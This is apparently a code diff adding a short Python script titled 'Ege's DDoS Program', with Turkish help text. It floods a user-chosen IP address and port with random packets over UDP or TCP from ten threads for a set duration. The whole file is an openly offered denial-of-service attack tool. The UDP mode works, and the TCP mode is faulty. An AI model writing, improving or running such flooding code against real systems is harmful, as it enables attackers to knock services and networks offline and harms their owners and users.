@@ -1,0 +1,38 @@
+#!/usr/bin/env python3
+import argparse
+import socket
+import random
+import time
+from threading import Thread
+
+def ddos_attack(protocol, target_ip, target_port, duration):
+    if protocol == "udp":
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    elif protocol == "tcp":
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+    bytes = random._urandom(1024)
+
+    timeout = time.time() + duration
+    while time.time() < timeout:
+        try:
+            sock.sendto(bytes, (target_ip, target_port))
+        except socket.error:
+            pass
+        if protocol == "tcp":
+            sock.close()
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Ege's DDoS Program")
+    parser.add_argument("--protocol", required=True, help="Saldırı protokolü (udp veya tcp)")
+    parser.add_argument("--target", required=True, help="Hedef IP adresi")
+    parser.add_argument("--port", type=int, required=True, help="Hedef port numarası")
+    parser.add_argument("--duration", type=int, required=True, help="Saldırının süresi (saniye)")
+
+    args = parser.parse_args()
+
+    for _ in range(10):
+        t = Thread(target=ddos_attack, args=(args.protocol, args.target, args.port, args.duration))
+        t.start()
+
+    print(f"{args.protocol.upper()} saldırısı başlatıldı. Hedef IP: {args.target}, Port: {args.port}, Süre: {args.duration} saniye.")
